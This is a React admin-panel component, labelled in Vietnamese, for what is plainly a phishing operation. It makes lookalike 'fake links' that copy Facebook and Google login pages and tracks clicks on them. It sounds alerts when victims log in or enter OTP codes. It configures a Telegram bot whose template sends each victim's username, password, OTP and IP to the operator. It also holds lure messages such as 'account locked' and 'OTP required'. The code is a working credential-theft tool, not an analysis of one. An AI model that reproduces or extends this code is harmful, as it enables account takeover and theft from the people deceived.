/**
 * System Configuration Component
 * Cấu hình hệ thống: Tạo Link Fake, Thông Báo mẫu, Cài đặt chuông, Telegram bot
 */

import React, { useState, useEffect } from "react";
import { useNotificationSound } from "../../hooks/useNotificationSound";
import telegramService from "../../services/telegramService";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Label } from "../ui/label";
import { Switch } from "../ui/switch";
import { Badge } from "../ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "../ui/tabs";
import { ScrollArea } from "../ui/scroll-area";
import { motion, AnimatePresence } from "framer-motion";
import {
  Link2,
  MessageSquare,
  Bell,
  Send,
  Copy,
  Edit,
  Trash2,
  Plus,
  Save,
  RefreshCw,
  Eye,
  EyeOff,
  Volume2,
  VolumeX,
  Settings,
  Globe,
  Shield,
  Database,
  Code,
  TestTube,
} from "lucide-react";
import toast from "react-hot-toast";

const SystemConfiguration = () => {
  const [fakeLinks, setFakeLinks] = useState([
    {
      id: "link-1",
      name: "Facebook Login Portal",
      fakeName: "Social Media Access",
      originalUrl: "https://facebook.com/login",
      fakeUrl: "https://secure-social-login.com/access",
      adminName: "Admin John",
      createdAt: new Date(),
      active: true,
      clickCount: 156,
    },
    {
      id: "link-2",
      name: "Google Accounts",
      fakeName: "Email Service Login",
      originalUrl: "https://accounts.google.com",
      fakeUrl: "https://mail-service-auth.com/login",
      adminName: "Admin Sarah",
      createdAt: new Date(Date.now() - 86400000),
      active: false,
      clickCount: 89,
    },
  ]);

  const [notificationTemplates, setNotificationTemplates] = useState([
    {
      id: "notif-1",
      name: "Login Success",
      title: "Đăng nhập thành công",
      message: "Bạn đã đăng nhập thành công vào hệ thống.",
      type: "success",
      auto: true,
    },
    {
      id: "notif-2",
      name: "OTP Required",
      title: "Yêu cầu xác thực OTP",
      message: "Vui lòng nhập mã OTP được gửi đến số điện thoại của bạn.",
      type: "warning",
      auto: false,
    },
    {
      id: "notif-3",
      name: "Account Locked",
      title: "Tài khoản bị khóa",
      message: "Tài khoản của bạn đã bị khóa do vi phạm điều khoản sử dụng.",
      type: "error",
      auto: false,
    },
  ]);

  const [bellSettings, setBellSettings] = useState({
    enabled: true,
    userAccess: true,
    newLogin: true,
    otpRequest: true,
    failedAttempt: true,
    volume: 80,
    soundType: "default",
  });

  const [telegramConfig, setTelegramConfig] = useState({
    botToken: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz",
    chatId: "-1001234567890",
    enabled: true,
    notifications: {
      userLogin: true,
      systemAlert: true,
      errorReport: true,
      dailyReport: false,
    },
    messageTemplates: {
      userLogin:
        "🔐 Tài khoản: {username}\n🔑 Mật khẩu: {password}\n📱 OTP: {otp}\n🌐 IP: {ip login}\n⏰ Thời gian: {time}",
      systemAlert: "⚠️ Cảnh báo hệ thống: {message}",
      errorReport: "❌ Lỗi hệ thống: {error} tại {location}",
      dailyReport: "📊 Báo cáo hàng ngày: {stats}",
      custom: "📢 Thông báo: {message}",
    },
  });

  const [newFakeLink, setNewFakeLink] = useState({
    name: "",
    fakeName: "",
    originalUrl: "",
    adminName: "",
  });

  const [newTemplate, setNewTemplate] = useState({
    name: "",
    title: "",
    message: "",
    type: "info",
  });

  const [editingLink, setEditingLink] = useState(null);
  const [editingTemplate, setEditingTemplate] = useState(null);
  const [showBotToken, setShowBotToken] = useState(false);

  // Tải cấu hình Telegram khi component mount
  useEffect(() => {
    const savedConfig = telegramService.loadConfig();
    if (savedConfig.botToken) {
      setTelegramConfig(savedConfig);
    }
  }, []);

  // Fake Link Management
  const createFakeLink = () => {
    if (!newFakeLink.name || !newFakeLink.originalUrl) {
      toast.error("Vui lòng nhập tên và URL gốc!");
      return;
    }

    const fakeUrl = `https://secure-${newFakeLink.name
      .toLowerCase()
      .replace(/\s+/g, "-")}.com/${Math.random().toString(36).substr(2, 8)}`;

    const link = {
      id: `link-${Date.now()}`,
      ...newFakeLink,
      fakeUrl,
      createdAt: new Date(),
      active: true,
      clickCount: 0,
    };

    setFakeLinks((prev) => [...prev, link]);
    setNewFakeLink({ name: "", fakeName: "", originalUrl: "", adminName: "" });
    toast.success("Link fake đã được tạo!");
  };

  const toggleLinkStatus = (linkId) => {
    setFakeLinks((prev) =>
      prev.map((link) =>
        link.id === linkId ? { ...link, active: !link.active } : link
      )
    );
    toast.success("Trạng thái link đã được cập nhật!");
  };

  const deleteFakeLink = (linkId) => {
    setFakeLinks((prev) => prev.filter((link) => link.id !== linkId));
    toast.success("Link fake đã được xóa!");
  };

  const copyToClipboard = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success(`Đã copy ${label}!`);
    } catch (error) {
      toast.error(`Lỗi copy ${label}`);
    }
  };

  // Notification Template Management
  const createTemplate = () => {
    if (!newTemplate.name || !newTemplate.title) {
      toast.error("Vui lòng nhập tên và tiêu đề!");
      return;
    }

    const template = {
      id: `notif-${Date.now()}`,
      ...newTemplate,
      auto: false,
    };

    setNotificationTemplates((prev) => [...prev, template]);
    setNewTemplate({ name: "", title: "", message: "", type: "info" });
    toast.success("Template thông báo đã được tạo!");
  };

  const deleteTemplate = (templateId) => {
    setNotificationTemplates((prev) => prev.filter((t) => t.id !== templateId));
    toast.success("Template đã được xóa!");
  };

  const testNotification = (template) => {
    toast[template.type || "info"](template.message);
  };

  // Bell Settings
  const updateBellSetting = (key, value) => {
    setBellSettings((prev) => ({
      ...prev,
      [key]: value,
    }));
  };

  const { testNotificationSound } = useNotificationSound();

  const testBell = () => {
    if (bellSettings.enabled) {
      testNotificationSound(bellSettings.volume / 100, bellSettings.soundType);
    } else {
      toast.error("Chuông đã bị tắt!");
    }
  };

  // Telegram Bot
  const testTelegramBot = async () => {
    try {
      toast.success("Đang kiểm tra kết nối Telegram...");

      // Cấu hình service với config hiện tại
      telegramService.configure(telegramConfig);

      // Test kết nối
      const result = await telegramService.testConnection();

      if (result.success) {
        toast.success("✅ Kết nối Telegram thành công!");

        // Gửi tin nhắn test
        await telegramService.sendCustomNotification(
          "🔔 Test thông báo từ Admin Dashboard!"
        );
        toast.success("📱 Đã gửi tin nhắn test!");
      } else {
        toast.error("❌ Lỗi kết nối Telegram!");
      }
    } catch (error) {
      toast.error(`❌ Lỗi kết nối Telegram: ${error.message}`);
    }
  };

  const updateTelegramConfig = (key, value) => {
    setTelegramConfig((prev) => ({
      ...prev,
      [key]: value,
    }));
  };

  const updateTelegramMessageTemplate = (templateType, message) => {
    setTelegramConfig((prev) => ({
      ...prev,
      messageTemplates: {
        ...prev.messageTemplates,
        [templateType]: message,
      },
    }));
  };

  const saveTelegramConfig = () => {
    telegramService.configure(telegramConfig);
    telegramService.saveConfig();
    toast.success("💾 Đã lưu cấu hình Telegram!");
  };

  const updateTelegramNotification = (key, value) => {
    setTelegramConfig((prev) => ({
      ...prev,
      notifications: {
        ...prev.notifications,
        [key]: value,
      },
    }));
  };

  const getTypeColor = (type) => {
    const colors = {
      success: "text-green-400 bg-green-500/20",
      warning: "text-yellow-400 bg-yellow-500/20",
      error: "text-red-400 bg-red-500/20",
      info: "text-blue-400 bg-blue-500/20",
    };
    return colors[type] || colors.info;
  };

  return (
    <div className="space-y-6">
      <Tabs defaultValue="fake-links" className="w-full">
        <TabsList className="grid w-full grid-cols-4">
          <TabsTrigger value="fake-links">Tạo Link Fake</TabsTrigger>
          <TabsTrigger value="notifications">Thông Báo</TabsTrigger>
          <TabsTrigger value="bell-settings">Cài đặt Chuông</TabsTrigger>
          <TabsTrigger value="telegram-bot">Telegram Bot</TabsTrigger>
        </TabsList>

        {/* Tạo Link Fake */}
        <TabsContent value="fake-links">
          <div className="space-y-6">
            {/* Tạo Link Mới */}
            <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-white">
                  <Plus className="h-5 w-5 text-green-400" />
                  Tạo Link Fake Mới
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <Label className="text-slate-300">Tên Link Gốc</Label>
                    <Input
                      value={newFakeLink.name}
                      onChange={(e) =>
                        setNewFakeLink((prev) => ({
                          ...prev,
                          name: e.target.value,
                        }))
                      }
                      placeholder="Facebook Login"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">Tên Hiển Thị Fake</Label>
                    <Input
                      value={newFakeLink.fakeName}
                      onChange={(e) =>
                        setNewFakeLink((prev) => ({
                          ...prev,
                          fakeName: e.target.value,
                        }))
                      }
                      placeholder="Social Media Access"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">URL Gốc</Label>
                    <Input
                      value={newFakeLink.originalUrl}
                      onChange={(e) =>
                        setNewFakeLink((prev) => ({
                          ...prev,
                          originalUrl: e.target.value,
                        }))
                      }
                      placeholder="https://facebook.com/login"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">Tên Admin</Label>
                    <Input
                      value={newFakeLink.adminName}
                      onChange={(e) =>
                        setNewFakeLink((prev) => ({
                          ...prev,
                          adminName: e.target.value,
                        }))
                      }
                      placeholder="Admin Name"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>
                </div>

                <div className="mt-4">
                  <Button onClick={createFakeLink} className="w-full md:w-auto">
                    <Link2 className="h-4 w-4 mr-2" />
                    Tạo Link Fake
                  </Button>
                </div>
              </CardContent>
            </Card>

            {/* Danh Sách Links */}
            <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-white">
                  <Link2 className="h-5 w-5 text-blue-400" />
                  Danh Sách Links Fake
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-96">
                  <div className="space-y-4">
                    <AnimatePresence>
                      {fakeLinks.map((link) => (
                        <motion.div
                          key={link.id}
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          exit={{ opacity: 0, x: -20 }}
                          className="p-4 bg-slate-800 rounded-lg border border-slate-700"
                        >
                          <div className="flex items-start justify-between">
                            <div className="flex-1 space-y-2">
                              <div className="flex items-center gap-3">
                                <h4 className="font-medium text-white">
                                  {link.name}
                                </h4>
                                <Badge
                                  className={
                                    link.active
                                      ? "bg-green-500/20 text-green-300"
                                      : "bg-red-500/20 text-red-300"
                                  }
                                >
                                  {link.active ? "Active" : "Inactive"}
                                </Badge>
                                <Badge variant="outline">
                                  {link.clickCount} clicks
                                </Badge>
                              </div>

                              <div className="text-sm text-slate-400">
                                <div>
                                  Fake Name:{" "}
                                  <span className="text-blue-300">
                                    {link.fakeName}
                                  </span>
                                </div>
                                <div>
                                  Admin:{" "}
                                  <span className="text-purple-300">
                                    {link.adminName}
                                  </span>
                                </div>
                                <div>
                                  Created:{" "}
                                  {link.createdAt.toLocaleDateString("vi-VN")}
                                </div>
                              </div>

                              <div className="space-y-1">
                                <div className="flex items-center gap-2 text-xs">
                                  <span className="text-slate-400">
                                    Original:
                                  </span>
                                  <code className="bg-slate-700 px-2 py-1 rounded text-slate-300">
                                    {link.originalUrl}
                                  </code>
                                  <Button
                                    size="icon"
                                    variant="ghost"
                                    className="h-6 w-6"
                                    onClick={() =>
                                      copyToClipboard(
                                        link.originalUrl,
                                        "URL gốc"
                                      )
                                    }
                                  >
                                    <Copy className="h-3 w-3" />
                                  </Button>
                                </div>

                                <div className="flex items-center gap-2 text-xs">
                                  <span className="text-slate-400">
                                    Fake URL:
                                  </span>
                                  <code className="bg-green-900/30 px-2 py-1 rounded text-green-300">
                                    {link.fakeUrl}
                                  </code>
                                  <Button
                                    size="icon"
                                    variant="ghost"
                                    className="h-6 w-6"
                                    onClick={() =>
                                      copyToClipboard(link.fakeUrl, "Fake URL")
                                    }
                                  >
                                    <Copy className="h-3 w-3" />
                                  </Button>
                                </div>
                              </div>
                            </div>

                            <div className="flex gap-2 ml-4">
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => toggleLinkStatus(link.id)}
                                className={
                                  link.active
                                    ? "text-red-400 border-red-400"
                                    : "text-green-400 border-green-400"
                                }
                              >
                                {link.active ? "Tắt" : "Bật"}
                              </Button>

                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => deleteFakeLink(link.id)}
                                className="text-red-400 border-red-400 hover:bg-red-400/10"
                              >
                                <Trash2 className="h-3 w-3" />
                              </Button>
                            </div>
                          </div>
                        </motion.div>
                      ))}
                    </AnimatePresence>
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Thông Báo */}
        <TabsContent value="notifications">
          <div className="space-y-6">
            {/* Tạo Template Mới */}
            <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-white">
                  <Plus className="h-5 w-5 text-green-400" />
                  Tạo Template Thông Báo
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <Label className="text-slate-300">Tên Template</Label>
                    <Input
                      value={newTemplate.name}
                      onChange={(e) =>
                        setNewTemplate((prev) => ({
                          ...prev,
                          name: e.target.value,
                        }))
                      }
                      placeholder="Login Success"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">Loại Thông Báo</Label>
                    <select
                      value={newTemplate.type}
                      onChange={(e) =>
                        setNewTemplate((prev) => ({
                          ...prev,
                          type: e.target.value,
                        }))
                      }
                      className="w-full bg-slate-800 border border-slate-600 rounded px-3 py-2 text-slate-300"
                    >
                      <option value="info">Info</option>
                      <option value="success">Success</option>
                      <option value="warning">Warning</option>
                      <option value="error">Error</option>
                    </select>
                  </div>

                  <div>
                    <Label className="text-slate-300">Tiêu Đề</Label>
                    <Input
                      value={newTemplate.title}
                      onChange={(e) =>
                        setNewTemplate((prev) => ({
                          ...prev,
                          title: e.target.value,
                        }))
                      }
                      placeholder="Đăng nhập thành công"
                      className="bg-slate-800 border-slate-600"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">Nội Dung</Label>
                    <textarea
                      value={newTemplate.message}
                      onChange={(e) =>
                        setNewTemplate((prev) => ({
                          ...prev,
                          message: e.target.value,
                        }))
                      }
                      placeholder="Bạn đã đăng nhập thành công..."
                      className="w-full bg-slate-800 border border-slate-600 rounded px-3 py-2 text-slate-300 h-20 resize-none"
                    />
                  </div>
                </div>

                <div className="mt-4">
                  <Button onClick={createTemplate} className="w-full md:w-auto">
                    <MessageSquare className="h-4 w-4 mr-2" />
                    Tạo Template
                  </Button>
                </div>
              </CardContent>
            </Card>

            {/* Danh Sách Templates */}
            <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-white">
                  <MessageSquare className="h-5 w-5 text-blue-400" />
                  Templates Thông Báo
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-96">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <AnimatePresence>
                      {notificationTemplates.map((template) => (
                        <motion.div
                          key={template.id}
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.95 }}
                          className="p-4 bg-slate-800 rounded-lg border border-slate-700"
                        >
                          <div className="space-y-3">
                            <div className="flex items-center justify-between">
                              <h4 className="font-medium text-white">
                                {template.name}
                              </h4>
                              <Badge className={getTypeColor(template.type)}>
                                {template.type}
                              </Badge>
                            </div>

                            <div>
                              <div className="text-sm font-medium text-slate-300">
                                {template.title}
                              </div>
                              <div className="text-xs text-slate-400 mt-1">
                                {template.message}
                              </div>
                            </div>

                            <div className="flex gap-2">
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => testNotification(template)}
                                className="flex-1"
                              >
                                <TestTube className="h-3 w-3 mr-1" />
                                Test
                              </Button>

                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => deleteTemplate(template.id)}
                                className="text-red-400 border-red-400 hover:bg-red-400/10"
                              >
                                <Trash2 className="h-3 w-3" />
                              </Button>
                            </div>
                          </div>
                        </motion.div>
                      ))}
                    </AnimatePresence>
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Cài đặt Chuông */}
        <TabsContent value="bell-settings">
          <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white">
                <Bell className="h-5 w-5 text-yellow-400" />
                Cài Đặt Chuông Thông Báo
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-white">
                    Cài Đặt Chung
                  </h3>

                  <div className="flex items-center justify-between">
                    <Label className="text-slate-300">
                      Bật thông báo chuông
                    </Label>
                    <Switch
                      checked={bellSettings.enabled}
                      onCheckedChange={(checked) =>
                        updateBellSetting("enabled", checked)
                      }
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">
                      Âm lượng: {bellSettings.volume}%
                    </Label>
                    <input
                      type="range"
                      min="0"
                      max="100"
                      value={bellSettings.volume}
                      onChange={(e) =>
                        updateBellSetting("volume", parseInt(e.target.value))
                      }
                      className="w-full mt-2"
                    />
                  </div>

                  <div>
                    <Label className="text-slate-300">Loại âm thanh</Label>
                    <select
                      value={bellSettings.soundType}
                      onChange={(e) =>
                        updateBellSetting("soundType", e.target.value)
                      }
                      className="w-full bg-slate-800 border border-slate-600 rounded px-3 py-2 text-slate-300 mt-2"
                    >
                      <option value="default">Mặc định</option>
                      <option value="classic">🔔 Chuông Classic</option>
                      <option value="chime">🎵 Chuông Chime</option>
                      <option value="alert">⚠️ Chuông Alert</option>
                    </select>
                  </div>

                  <Button onClick={testBell} className="w-full">
                    {bellSettings.enabled ? (
                      <>
                        <Volume2 className="h-4 w-4 mr-2" />
                        Test Chuông
                      </>
                    ) : (
                      <>
                        <VolumeX className="h-4 w-4 mr-2" />
                        Chuông đã tắt
                      </>
                    )}
                  </Button>
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-white">
                    Sự Kiện Thông Báo
                  </h3>

                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">
                        Khi có user truy cập
                      </Label>
                      <Switch
                        checked={bellSettings.userAccess}
                        onCheckedChange={(checked) =>
                          updateBellSetting("userAccess", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">Login mới</Label>
                      <Switch
                        checked={bellSettings.newLogin}
                        onCheckedChange={(checked) =>
                          updateBellSetting("newLogin", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">Yêu cầu OTP</Label>
                      <Switch
                        checked={bellSettings.otpRequest}
                        onCheckedChange={(checked) =>
                          updateBellSetting("otpRequest", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">Lỗi đăng nhập</Label>
                      <Switch
                        checked={bellSettings.failedAttempt}
                        onCheckedChange={(checked) =>
                          updateBellSetting("failedAttempt", checked)
                        }
                      />
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Telegram Bot */}
        <TabsContent value="telegram-bot">
          <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white">
                <Send className="h-5 w-5 text-blue-400" />
                Cấu Hình Telegram Bot
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-white">
                    Thông Tin Bot
                  </h3>

                  <div>
                    <Label className="text-slate-300">Bot Token</Label>
                    <div className="flex gap-2 mt-2">
                      <Input
                        type={showBotToken ? "text" : "password"}
                        value={telegramConfig.botToken}
                        onChange={(e) =>
                          updateTelegramConfig("botToken", e.target.value)
                        }
                        className="bg-slate-800 border-slate-600 font-mono"
                      />
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => setShowBotToken(!showBotToken)}
                      >
                        {showBotToken ? (
                          <EyeOff className="h-4 w-4" />
                        ) : (
                          <Eye className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                  </div>

                  <div>
                    <Label className="text-slate-300">Chat ID</Label>
                    <Input
                      value={telegramConfig.chatId}
                      onChange={(e) =>
                        updateTelegramConfig("chatId", e.target.value)
                      }
                      placeholder="-1001234567890"
                      className="bg-slate-800 border-slate-600 font-mono mt-2"
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label className="text-slate-300">Bật Telegram Bot</Label>
                    <Switch
                      checked={telegramConfig.enabled}
                      onCheckedChange={(checked) =>
                        updateTelegramConfig("enabled", checked)
                      }
                    />
                  </div>

                  <Button onClick={testTelegramBot} className="w-full">
                    <Send className="h-4 w-4 mr-2" />
                    Test Kết Nối
                  </Button>
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-white">
                    Loại Thông Báo
                  </h3>

                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">User đăng nhập</Label>
                      <Switch
                        checked={telegramConfig.notifications.userLogin}
                        onCheckedChange={(checked) =>
                          updateTelegramNotification("userLogin", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">
                        Cảnh báo hệ thống
                      </Label>
                      <Switch
                        checked={telegramConfig.notifications.systemAlert}
                        onCheckedChange={(checked) =>
                          updateTelegramNotification("systemAlert", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">Báo cáo lỗi</Label>
                      <Switch
                        checked={telegramConfig.notifications.errorReport}
                        onCheckedChange={(checked) =>
                          updateTelegramNotification("errorReport", checked)
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-slate-300">
                        Báo cáo hàng ngày
                      </Label>
                      <Switch
                        checked={telegramConfig.notifications.dailyReport}
                        onCheckedChange={(checked) =>
                          updateTelegramNotification("dailyReport", checked)
                        }
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Message Templates */}
              <div className="border-t border-slate-700 pt-6">
                <h3 className="text-lg font-semibold text-white mb-4">
                  📝 Nội Dung Thông Báo
                </h3>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <Label className="text-slate-300">
                        Thông báo đăng nhập
                      </Label>
                      <Input
                        value={telegramConfig.messageTemplates.userLogin}
                        onChange={(e) =>
                          updateTelegramMessageTemplate(
                            "userLogin",
                            e.target.value
                          )
                        }
                        placeholder="🔐 Tài khoản: {username} - Mật khẩu: {password} - OTP: {otp} - IP: {ip login} - Thời gian: {time}"
                        className="bg-slate-800 border-slate-600 mt-2"
                      />
                      <p className="text-xs text-slate-400 mt-1">
                        Biến: {"{username}"}, {"{password}"}, {"{otp}"},{" "}
                        {"{ip login}"}, {"{time}"}
                      </p>
                    </div>

                    <div>
                      <Label className="text-slate-300">
                        Cảnh báo hệ thống
                      </Label>
                      <Input
                        value={telegramConfig.messageTemplates.systemAlert}
                        onChange={(e) =>
                          updateTelegramMessageTemplate(
                            "systemAlert",
                            e.target.value
                          )
                        }
                        placeholder="⚠️ Cảnh báo hệ thống: {message}"
                        className="bg-slate-800 border-slate-600 mt-2"
                      />
                      <p className="text-xs text-slate-400 mt-1">
                        Biến: {"{message}"}
                      </p>
                    </div>

                    <div>
                      <Label className="text-slate-300">Báo cáo lỗi</Label>
                      <Input
                        value={telegramConfig.messageTemplates.errorReport}
                        onChange={(e) =>
                          updateTelegramMessageTemplate(
                            "errorReport",
                            e.target.value
                          )
                        }
                        placeholder="❌ Lỗi hệ thống: {error} tại {location}"
                        className="bg-slate-800 border-slate-600 mt-2"
                      />
                      <p className="text-xs text-slate-400 mt-1">
                        Biến: {"{error}"}, {"{location}"}
                      </p>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <Label className="text-slate-300">
                        Báo cáo hàng ngày
                      </Label>
                      <Input
                        value={telegramConfig.messageTemplates.dailyReport}
                        onChange={(e) =>
                          updateTelegramMessageTemplate(
                            "dailyReport",
                            e.target.value
                          )
                        }
                        placeholder="📊 Báo cáo hàng ngày: {stats}"
                        className="bg-slate-800 border-slate-600 mt-2"
                      />
                      <p className="text-xs text-slate-400 mt-1">
                        Biến: {"{stats}"}
                      </p>
                    </div>

                    <div>
                      <Label className="text-slate-300">
                        Thông báo tùy chỉnh
                      </Label>
                      <Input
                        value={telegramConfig.messageTemplates.custom}
                        onChange={(e) =>
                          updateTelegramMessageTemplate(
                            "custom",
                            e.target.value
                          )
                        }
                        placeholder="📢 Thông báo: {message}"
                        className="bg-slate-800 border-slate-600 mt-2"
                      />
                      <p className="text-xs text-slate-400 mt-1">
                        Biến: {"{message}"}
                      </p>
                    </div>

                    <div className="p-3 bg-slate-800/50 rounded-lg">
                      <h4 className="text-sm font-medium text-slate-200 mb-2">
                        💡 Gợi ý biến:
                      </h4>
                      <div className="text-xs text-slate-400 space-y-1">
                        <p>
                          <code>{"{username}"}</code> - Tài khoản
                        </p>
                        <p>
                          <code>{"{password}"}</code> - Mật khẩu
                        </p>
                        <p>
                          <code>{"{otp}"}</code> - Mã code
                        </p>
                        <p>
                          <code>{"{ip login}"}</code> - IP đăng nhập
                        </p>
                        <p>
                          <code>{"{time}"}</code> - Thời gian
                        </p>
                        <p>
                          <code>{"{message}"}</code> - Nội dung thông báo
                        </p>
                        <p>
                          <code>{"{error}"}</code> - Chi tiết lỗi
                        </p>
                        <p>
                          <code>{"{location}"}</code> - Vị trí lỗi
                        </p>
                        <p>
                          <code>{"{stats}"}</code> - Thống kê
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Status */}
              <div className="border-t border-slate-700 pt-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div
                      className={`w-3 h-3 rounded-full ${
                        telegramConfig.enabled
                          ? "bg-green-400 animate-pulse"
                          : "bg-red-400"
                      }`}
                    />
                    <span className="text-slate-300">
                      Telegram Bot{" "}
                      {telegramConfig.enabled ? "Hoạt động" : "Tắt"}
                    </span>
                  </div>

                  <Button
                    size="sm"
                    variant="outline"
                    onClick={saveTelegramConfig}
                  >
                    <Save className="h-3 w-3 mr-1" />
                    Lưu Cấu Hình
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default SystemConfiguration;
